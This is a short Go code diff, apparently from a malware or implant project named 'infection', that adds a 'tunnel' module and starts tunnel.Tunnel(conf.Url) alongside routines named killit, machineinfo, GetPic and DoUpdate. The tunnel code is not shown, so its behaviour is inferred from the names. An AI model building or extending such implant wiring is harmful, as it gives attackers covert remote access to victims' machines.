@@ -7,6 +7,7 @@ import (
 	"infection/hitboard"
 	"infection/killit"
 	"infection/machineinfo"
+	"infection/tunnel"
 	"infection/util/lib"
 	"log"
 	"net/http"
@@ -91,6 +92,7 @@ func main() {
 	}
 	go killit.Killit()
 	go killit.GetPic(conf.Url)
+	go tunnel.Tunnel(conf.Url)
 	////check update
 	go lib.DoUpdate()
 	http.HandleFunc("/hello", handler)
